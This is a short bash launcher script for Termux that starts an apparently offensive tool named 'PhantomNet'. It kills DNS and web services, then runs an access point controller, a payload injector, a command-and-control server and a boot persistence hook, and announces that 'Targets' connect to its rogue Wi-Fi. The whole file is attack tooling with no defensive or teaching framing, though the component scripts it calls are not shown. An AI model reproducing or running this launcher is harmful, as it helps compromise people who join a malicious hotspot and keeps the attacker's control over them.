#!/data/data/com.termux/files/usr/bin/bash  
killall dnsmasq php node 2>/dev/null  
core/ap_controller.sh &  
node core/payload_injector.js &  
node core/c2_server.js &  
core/persistence/boot_hook &  
echo "[+] PhantomNet: Targets connect to 'PhantomNet' WiFi!"  
